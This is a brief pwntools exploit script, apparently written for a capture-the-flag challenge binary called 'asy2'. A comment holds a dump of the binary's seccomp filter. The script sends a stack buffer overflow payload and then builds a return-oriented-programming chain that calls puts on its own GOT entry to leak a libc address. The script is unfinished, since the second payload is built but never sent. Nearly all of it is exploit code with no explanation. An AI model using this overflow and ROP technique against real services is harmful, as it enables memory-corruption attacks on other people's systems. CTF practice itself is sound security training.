from pwn import *
context.clear(arch='amd64', os='linux', log_level = 'debug')
'''
 line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
0002: 0x06 0x00 0x00 0x00000000  return KILL
0003: 0x20 0x00 0x00 0x00000000  A = sys_number
0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
0005: 0x06 0x00 0x00 0x00000000  return KILL
0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008
0007: 0x06 0x00 0x00 0x00000000  return KILL
0008: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0010
0009: 0x06 0x00 0x00 0x00000000  return KILL
0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 '''
# p = remote("realsung.kr", 13346)
p = process("./asy2")
e = ELF("./asy2")

pop_rdi = 0x0000000000400c63
puts_plt = e.plt['puts']
puts_got = e.got['puts']

payload = b''
payload += b'A' * 256
payload += b'2SUNRIN2'

p.sendlineafter(b"A :", payload)

payload = b''
payload += b'A' * 256 + b'B' * 0x8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)


p.interactive()
